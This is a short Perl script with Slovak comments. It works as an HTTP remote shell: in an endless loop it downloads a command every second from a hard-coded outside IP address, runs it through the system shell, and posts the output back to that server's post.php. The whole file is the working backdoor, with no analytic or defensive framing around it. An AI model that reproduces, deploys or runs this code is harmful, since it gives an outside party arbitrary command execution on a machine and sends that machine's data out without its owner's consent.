use strict;
use warnings;

use LWP::UserAgent;
use LWP::Simple;

my $last="";

while (1){

	#LWI::Simple. stahujem obsah suboru actual.txt do $actual 
	my $geturl = "http://195.146.133.198/httpsh/actual.txt";
	my $actual = get $geturl;

	#spustenie komandu a ulozenie do $out
	my $out;
	$out = "Command: ".$actual;
	for my $line (`$actual`) {
	$out .= $line;
	}
	$out .= "\n\n";
	if ($actual ne $last){
		#zaslanie vystupu commandu ($out) cez http post na server
		my $posturl = 'http://195.146.133.198/httpsh/post.php';
		my $ua       = LWP::UserAgent->new();
		my $response = $ua->post( $posturl, { 'postdata' => $out } );
	}
	$last = $actual;
	sleep(1);
	print ".";
}
